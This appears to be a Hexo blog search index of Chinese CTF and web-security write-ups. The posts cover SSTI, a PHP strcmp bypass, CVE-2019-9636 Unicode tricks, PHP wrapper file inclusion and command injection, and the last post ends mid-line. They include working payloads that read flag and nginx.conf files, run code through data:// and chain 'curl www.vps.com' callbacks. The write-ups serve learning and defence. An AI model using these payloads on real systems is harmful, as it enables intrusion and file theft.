<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SSTI注入分析与防御</title>
    <link href="/2021/11/15/SSTI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <url>/2021/11/15/SSTI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI分析与防御-CISCN2019-华东南赛区-Web11"><a href="#SSTI分析与防御-CISCN2019-华东南赛区-Web11" class="headerlink" title="SSTI分析与防御([CISCN2019 华东南赛区]Web11)"></a>SSTI分析与防御([CISCN2019 华东南赛区]Web11)</h1><h2 id="SST（模板引擎）"><a href="#SST（模板引擎）" class="headerlink" title="SST（模板引擎）"></a>SST（模板引擎）</h2><blockquote><p>模板引擎（这里特指用于<strong>Web开发</strong>的模板引擎）是为了<strong>使用户界面与业务数据（内容）分离</strong>而产生的，它可以<strong>生成特定格式的文档</strong>，用于网站的模板引擎就会<strong>生成一个标准的HTML文档</strong>。</p><p>—百度百科</p></blockquote><p>​    模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。    </p><p>​    通过模板可以将输入转换成特定的格式，在HTML网页中即使没有内容，但是有预先定义好的变量，通过访问该变量转换成想要的内容。</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115200306057.png" alt="image-20211115200306057"></p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115200405805.png" alt="image-20211115200405805"></p><p>当我们没有传入参数的时候，是默认的guest，当我们对该网址进行请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1:5000/?name=aaa<br></code></pre></td></tr></table></figure><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115200508474.png" alt="image-20211115200508474"></p><h2 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h2><ul><li>前端渲染</li><li>后端渲染</li><li>浏览器渲染</li></ul><blockquote><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板就是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的实现手段，在前后端都有应用</p></blockquote><p>​    个人理解：就是将数据交给模板处理，然后让渲染引擎去将数据生成为HTML的文本，返回给浏览器</p><h3 id="后端渲染"><a href="#后端渲染" class="headerlink" title="后端渲染"></a>后端渲染</h3><blockquote><p>后端渲染的话，浏览器会直接将接收到HTML字符串，这中间是由服务器经过解析存放在服务器端的模板文件来完成的，这种情况下，浏览器只是进行了HTML的解析，以及显示给用户</p></blockquote><h3 id="前端渲染"><a href="#前端渲染" class="headerlink" title="前端渲染"></a>前端渲染</h3><blockquote><p>浏览器从后端得到信息，将信息组织并排列形成HTML代码，然后进行显示</p></blockquote><h2 id="为什么需要服务器模板"><a href="#为什么需要服务器模板" class="headerlink" title="为什么需要服务器模板"></a>为什么需要服务器模板</h2><p>​    为了方便，用模板引擎进PHP或者Python等与HTML代码进行分离。服务器端模板提供了更加简单的方法管理动态生成的HTML代码，最大的优点就是可以在服务器动态生成HTML界面。</p><h2 id="什么是服务器模板注入"><a href="#什么是服务器模板注入" class="headerlink" title="什么是服务器模板注入"></a>什么是服务器模板注入</h2><p>​    SSTI是获取一个用户可控的输入点，在后端的渲染处理上进行拼接。就像开头那一部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$twig</span> = <span class="hljs-keyword">new</span> Twig_Environment(<span class="hljs-keyword">new</span> Twig_Loader_String());  <span class="hljs-comment">// Twig是php里面的一个模板引擎</span><br> <br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$twig</span>-&gt;render(<span class="hljs-string">&quot;Hello <span class="hljs-subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);  <span class="hljs-comment">// 将用户输入作为模版内容的一部分</span><br> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;   <span class="hljs-comment">//输出在网页上</span><br>    <span class="hljs-comment">// 该案例使用了PHP的Twig模板，上面用的Python jinja2模板</span><br></code></pre></td></tr></table></figure><p>​        </p><p>​    使用Twig模板引擎渲染页面，因为其中模板有<code>&#123;&#123;name&#125;&#125;</code>变量，其模板变量值来自于GET请求参数<code>$_GET[&#39;name&#39;]</code>,这是一个用户输入点，可以对其进行控制；可以输出传递的变量之外，还可以执行基本表达式，然后将其结果作为模板的值，示例</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115202405600.png" alt="image-20211115202405600"></p><p>​    每一个==模板引擎都有着自己的语法==，Payload要根据具体情况构造。<br>​    简单来说,就是更改请求参数使之承载含有模板引擎语法的 Payload,通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析,有解析则可以判定含有 Payload 对应模板引擎注入,否则不存在 SSTI。</p><h2 id="BUUCTF–-CISCN2019-华东南赛区-Web11"><a href="#BUUCTF–-CISCN2019-华东南赛区-Web11" class="headerlink" title="BUUCTF–[CISCN2019 华东南赛区]Web11"></a>BUUCTF–[CISCN2019 华东南赛区]Web11</h2><p>访问网址</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115203454688.png" alt="image-20211115203454688"></p><p>一开始啥也看不出来，直到看到文中有个<code>X-Forwarded-For</code>,于是去抓包</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115203630635.png" alt="image-20211115203630635"></p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115203920023.png" alt="image-20211115203920023"></p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115203944702.png" alt="image-20211115203944702"></p><p>当我们在<code>X-Forwarded-For</code>里传入值，他的网页上的IP也会更改，尝试SSTI</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115204004935.png" alt="image-20211115204004935"></p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115203754442.png" alt="image-20211115203754442"></p><p>可行</p><p>直接读取Flag</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211115204037217.png" alt="image-20211115204037217"></p><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">X-Forwarded-For: &#123;&#123;system(<span class="hljs-string">&quot;cat ../../../../../../flag&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>​    可以像使用<code>eval()</code>函数一样处理字符串加载功能，尽可能加载静态模板文件。也要防范本地文件包含，该功能类似于<code>require()</code>函数调用，不允许用户控制此类文件或者内容的路径</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.jianshu.com/p/aef2ae0498df">https://www.jianshu.com/p/aef2ae0498df</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP-strcmp安全特性</title>
    <link href="/2021/11/08/PHP%E5%AE%89%E5%85%A8-strcmp%E7%89%B9%E6%80%A7/"/>
    <url>/2021/11/08/PHP%E5%AE%89%E5%85%A8-strcmp%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-strcmp"><a href="#PHP-strcmp" class="headerlink" title="PHP-strcmp"></a>PHP-strcmp</h1><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><p><code>strcmp()</code>:比较两个字符串（区分大小写）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> strcmp(<span class="hljs-string">&quot;Hello world！&quot;</span>,<span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>strcmp()</code>函数是二进制安全的，且对大小写敏感</p></blockquote><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>strcmp(string1,string)</code></p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">string1</td><td align="center">必需，规定要比较的第一个字符串。</td></tr><tr><td align="center">string2</td><td align="center">必需。规定要比较的第二个字符串。</td></tr></tbody></table><hr><p>返回值：</p><ul><li>0    - 如果两个字符串相等</li><li>&lt;0    - 如果str1 小于 str2</li><li>&gt;0  - 如果str1 大于 str2</li></ul><blockquote><p>5.2 中是将两个参数先转换成string类型。<br>5.3.3以后，当比较数组和字符串的时候，返回是0。<br>5.5 中如果参数不是string类型，直接return了</p></blockquote><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211108100838062.png" alt="image-20211108100838062"></p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211108100858634.png" alt="image-20211108100858634"></p><h2 id="函数漏洞"><a href="#函数漏洞" class="headerlink" title="函数漏洞"></a>函数漏洞</h2><p>适用于PHP5.3之前的版本</p><p>在5.3版本之前，传入类型是字符串类型，当传入的类型不是字符串类型，函数就会发生错误，显示错误信息并且<code>return 0</code>，也就是说虽然报错了但是判定其相等</p><p>示例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;***************&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (strcmp(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$password</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;ABCABC&#125;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;xxxxxxxx &quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211108101822770.png" alt="image-20211108101822770"></p><p>只要我们在$_GET[‘password’]处传入非字符串类型，传入一个数组或者Object即可；PHP为了可以上传一个数组，会把结尾带一对中括号的变量，例如xxx[]=name</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>[runoob][<a href="https://www.runoob.com/php/func-string-strcmp.html]">https://www.runoob.com/php/func-string-strcmp.html]</a></li><li><a href="https://www.cnblogs.com/xhds/p/12312055.html">https://www.cnblogs.com/xhds/p/12312055.html</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU-SUCTF—2019Pythonginx1</title>
    <link href="/2021/11/07/BUU-SUCTF%E2%80%942019Pythonginx1/"/>
    <url>/2021/11/07/BUU-SUCTF%E2%80%942019Pythonginx1/</url>
    
    <content type="html"><![CDATA[<h1 id="BUU-SUCTF-2019-Pythonginx"><a href="#BUU-SUCTF-2019-Pythonginx" class="headerlink" title="BUU-[SUCTF 2019]Pythonginx"></a>BUU-[SUCTF 2019]Pythonginx</h1><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>CVE-2019-9636<ul><li>urlsplit不处理NFKC标准化</li></ul></li><li>Nginx重要文件位置</li><li>url的unicode漏洞引发的域名安全问题（涉及资料后面回提及到）</li></ul><h3 id="CVE-2019-9636"><a href="#CVE-2019-9636" class="headerlink" title="CVE-2019-9636"></a>CVE-2019-9636</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Python2.7.16-Python3.7.2</p><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>在NFKC规范化期间，Unicode编码处理不当（使用不正确的Netloc）</p><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><p>CVE编号: CVE-2019-9636</p><p>漏洞类型: 信息泄露</p><p>披露时间: 2019-03-08</p><p>cvss3评分：9.8</p><p>cvss3因子：CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</p><hr><p>使用Pythoncode/IDNA编码的url使用NFKC规范化来分解字符。</p><p>例如：<code>\uFF03</code>不想等于<code>#</code>，但是规范化了<code>#</code>，且改变了URL的片段部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;u = <span class="hljs-string">&quot;https://example.com \uFF03@bing.com&quot;</span><br>&gt;&gt;&gt;urlsplit(u).netloc.rpartition(<span class="hljs-string">&quot;@&quot;</span>)[<span class="hljs-number">2</span>]<br>bing.com<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>u = <span class="hljs-string">&quot; https://example.&quot;</span>.encode(<span class="hljs-string">&quot;idna&quot;</span>).decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>urlsplit(u).netloc.rpartition(<span class="hljs-string">&quot;@&quot;</span>)[<span class="hljs-number">2</span>] <br>example.com<br><br><span class="hljs-comment"># (Note that .netloc includes user/pass and .rpartition(&quot;@&quot;) is often used to remove it.)</span><br></code></pre></td></tr></table></figure><h3 id="Nginx存放路径"><a href="#Nginx存放路径" class="headerlink" title="Nginx存放路径"></a>Nginx存放路径</h3><ul><li>配置文件存放目录：/etc/nginx</li><li>主配置文件：/etc/nginx/conf/nginx.conf</li><li>管理脚本：/usr/lib64/systemd/system/nginx.service</li><li>模块：/usr/lisb64/nginx/modules</li><li>应用程序：/usr/sbin/nginx</li><li>程序默认存放位置：/usr/share/nginx/html</li><li>日志默认存放位置：/var/log/nginx</li><li>配置文件目录为：/usr/local/nginx/conf/nginx.conf</li></ul><blockquote><p>现在nginx网站配置从nginx.conf转到同目录文件夹下的default.config</p></blockquote><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>先去直接看源码。给的不全，大致也能明白一些</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211107210407607.png" alt="image-20211107210407607">三个if均是检验是否是<code>suctf.cc</code>，在最后还要必须有。</p><p>对这方面知识欠缺，所以看了下大佬的wp</p><p>关键点在于</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211107210857009.png" alt="image-20211107210857009"></p><p>大体意思就是对域名进行idna编码，然后再utf-8解码。百度搜索就出来这个漏洞</p><ul><li><p><strong>CVE-2019-9636：urlsplit 不处理 NFKC 标准化</strong></p></li><li><p><strong>CVE-2019-10160：urlsplit NFKD 标准化漏洞</strong></p></li></ul><p>然后构造Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">file:////suctf.cc/usr/local/nginx/conf/nginx.conf<br></code></pre></td></tr></table></figure><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211107211730375.png" alt="image-20211107211730375"></p><p>直接拿下flag</p><h3 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h3><p>利用<code>ℂ</code>来代替<code>c</code>及进行绕过</p><blockquote><p>在unicode中还有一种字符<code>℀</code>(U+2100)，当IDNA处理此字符时，会将<code>℀</code>变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。</p></blockquote><p>altman师傅的脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8 </span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>,<span class="hljs-number">65537</span>):    <br>    tmp=<span class="hljs-built_in">chr</span>(i)    <br>    <span class="hljs-keyword">try</span>:        <br>        res = tmp.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;-&quot;</span>) <span class="hljs-keyword">in</span> res:            <br>            <span class="hljs-keyword">continue</span>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(tmp, res, i))    <br>    <span class="hljs-keyword">except</span>:        <br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://bugs.python.org/issue36216">https://bugs.python.org/issue36216</a></li><li>[idna与utf8编码漏洞][<a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html]">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html]</a></li><li>[url中的unicode漏洞引发的域名安全问题][<a href="https://xz.aliyun.com/t/6070#toc-7]">https://xz.aliyun.com/t/6070#toc-7]</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP安全-伪协议</title>
    <link href="/2021/11/07/PHP%E5%AE%89%E5%85%A8-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/11/07/PHP%E5%AE%89%E5%85%A8-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP安全-伪协议"><a href="#PHP安全-伪协议" class="headerlink" title="PHP安全-伪协议"></a>PHP安全-伪协议</h1><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><blockquote><p>​         程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数<br>时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p><p>​        随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包<br>含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变<br>量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做<br>合理的校验或者校验被绕过就造成了文件包含漏洞。</p></blockquote><h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td><code>include(0)</code></td><td>获取指定文件中存在的所有文本/代码/标记，并复制到<code>include</code>语句的文件中</td></tr><tr><td><code>include_once</code></td><td>重复调用同一文件时，只调用一次，功能与<code>include</code>相同</td></tr><tr><td><code>require</code></td><td>如果执行发生错误，函数回报错并终止脚本</td></tr><tr><td><code>require_once</code></td><td>重复调用同一文件时，只调用一次，功能与<code>require</code>相同</td></tr><tr><td><del>highlight_file</del></td><td><del>对文件进行语法高亮显示。</del></td></tr><tr><td><del>show_source</del></td><td><del>对文件进行语法高亮显示。highligth_file别名</del></td></tr><tr><td><del>readfile</del></td><td><del>读取一个文件，并写入到输出缓冲，成功则返回文件中读入的字节数，失败则返回false并附带报错信息</del></td></tr><tr><td><del>file_get_contents</del></td><td><del>把整个文件读入一个字符串中</del></td></tr><tr><td><del>fopen</del></td><td><del>打开文件或者 URL</del></td></tr><tr><td><del>file</del></td><td><del>把整个文件读入一个数组中。</del></td></tr></tbody></table><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">//   -- 访问本地文件系统</span><br>http:<span class="hljs-comment">//   -- 访问HTTP（s）网址</span><br>ftp:<span class="hljs-comment">//    -- 访问FTP网址</span><br>php:<span class="hljs-comment">//    -- 访问各个I/O流</span><br>zlib:<span class="hljs-comment">//   -- 压缩流</span><br>data:<span class="hljs-comment">//   -- 数据（RFC 2397）</span><br>glob:<span class="hljs-comment">//   -- 查照匹配的文件路径模式</span><br>phar:<span class="hljs-comment">//   -- PHP归档</span><br>ssh2:<span class="hljs-comment">//   -- Secure Shell 2</span><br>rar:<span class="hljs-comment">//    -- RAR</span><br>ogg:<span class="hljs-comment">//    -- 音频流</span><br>expect:<span class="hljs-comment">// -- 处理交互式的流</span><br></code></pre></td></tr></table></figure><h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>​    常用于读取源码，<code>PHP://input</code>用于执行代码，是一种元包装器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=../flag.php</span><br></code></pre></td></tr></table></figure><p>读取出来的源码是Base64编码后的，需进行解码</p><hr><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h3><p>​    用于访问本地文件系统，不受<code>allow_url_include</code>和<code>allow_url_fopen</code>的影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?paht=file:<span class="hljs-comment">///var/www/html/flag.txt</span><br></code></pre></td></tr></table></figure><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211107151222745.png" alt="image-20211107151222745"></p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211107151240722.png" alt="image-20211107151240722"></p><hr><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code> 可以访问请求的原始数据的只读流，将POST请求作中的数据作为PHP代码执行</p><p>可以通过该方法写入PHP文件，输入<code>file=php://input</code>，然后抓包修改内容</p><hr><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h3><p>该协议可以直接达到执行PHP代码的效果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以进行<code>Base64编码</code>访问</p><hr><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>直接访问压缩文件中的子文件，不需要指定后缀名</p><h3 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2://"></a>bzip2://</h3><p>属于<code>压缩流</code>，同理，但是访问的是文件自身</p><h3 id="zlib"><a href="#zlib" class="headerlink" title="zlib://"></a>zlib://</h3><p>同<code>bzip2://</code>，如果网站允许上传压缩文件，那么可以将PHP文件进行压缩后在进行上传，通过压缩流协议执行。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令注入_1</title>
    <link href="/2021/11/06/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-1/"/>
    <url>/2021/11/06/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-1/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><blockquote><p>命令执行一般发生在远程，故被称为远程命令执行，即<code>RCE（Remote Command Exec）</code>，也被称为<code>Remote Code Exec</code></p><p>用途：</p><ul><li>技巧性获取Flag</li><li>进行反弹Shell</li><li>利用出题人对权限的控制不严格，对题目拥有控制权，导致其他队伍选手无法解题</li></ul></blockquote><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="命令执行原理"><a href="#命令执行原理" class="headerlink" title="命令执行原理"></a>命令执行原理</h3><blockquote><p>通常会存在各种执行外部程序的函数，当调用函数执行且未对输入做过滤时，通过注入恶意命令，会造成巨大危害</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>system(<span class="hljs-string">&#x27;echo&#x27;</span>. <span class="hljs-variable">$dir</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通常为了解决url中的歧义表达，会将一些特殊字符进行URL编码，%26就是&amp;的意思，在编程语言中，&amp;&amp;是and语法的表达：</p><p>​                                                                        <code>（表达式1）and （表达式2）</code></p><p>​    当两边表达式都为真时，才会返回真，；类似的：or 语法 用<code>||</code> 表示，（注意他们之间存在惰性）<br>在and语法中，若第一个表达式结果为假，则第二个表达式也不会执行，因为它的恒为假<br>在or语法中，若第一个表达式为真，则第二个表达式也不会执行，因为它的恒为真</p><p>​    命令注入就是通过注入一些特殊字符，改变原本的执行意图，从而执行攻击者指定的指令</p><h3 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h3><h4 id="1、转义字符"><a href="#1、转义字符" class="headerlink" title="1、转义字符"></a>1、转义字符</h4><blockquote><p>转义字符即为取消字符的特殊意义</p></blockquote><ul><li>Windows<ul><li>转义字符为<code>^</code></li></ul></li><li>Linux<ul><li>转义字符为<code>\</code></li></ul></li></ul><h4 id="2、多条命令执行"><a href="#2、多条命令执行" class="headerlink" title="2、多条命令执行"></a>2、多条命令执行</h4><p>下面是一些能构成多条命令执行的字符串：</p><ul><li>Windows<ul><li><code>&amp;&amp;</code></li><li><code>||</code></li><li><code>%0a</code></li></ul></li><li>Linux<ul><li><code>&amp;&amp;</code></li><li><code>||</code></li><li><code>;</code></li><li><code>$()</code></li><li>``</li><li><code>%0a</code></li><li><code>%0d</code></li></ul></li></ul><blockquote><p>在Linux下要注意：双引号包裹起来的字符串<code>$()</code>或者``的内容被当做命令执行，但是单引号包裹起来的字符串就是纯字符串，不会进行任何解析</p></blockquote><h4 id="3、注释符号"><a href="#3、注释符号" class="headerlink" title="3、注释符号"></a>3、注释符号</h4><ul><li>Windows<ul><li><code>::</code><ul><li>在BAT批处理脚本中用得比较多</li></ul></li></ul></li><li>Linux<ul><li><code>#</code><ul><li>在bash脚本中用的比较多</li></ul></li></ul></li></ul><h3 id="命令执行的基本测试"><a href="#命令执行的基本测试" class="headerlink" title="命令执行的基本测试"></a>命令执行的基本测试</h3><p>​    在面对未知的命令注入时，最好通过各种Fuzz来确认命令注入点和黑名单规则</p><p>​                            <code>程序名1 -程序参数1 参数值1 &amp;&amp; 程序2 -程序参数名2 参数值2</code></p><p>示例： </p><p><code>ping -nc 1 www.baidu.com</code></p><ul><li><p>程序名：<code>ping</code></p></li><li><p>参数：<code>-nc</code></p></li><li><p>参数值：<code>1</code>和<code>www.baidu.com</code></p></li><li><p>程序名与参数值之间的字符串：空格</p></li><li><p>整个命令</p><p>参数值有时较为复杂，可能部分可控，被双引号、单引号包裹，这时候需要注入额外的引号来逃逸</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&amp;&amp; curl www.vps.com &amp;&amp;<br>`curl www.vps.com`<br>;curl 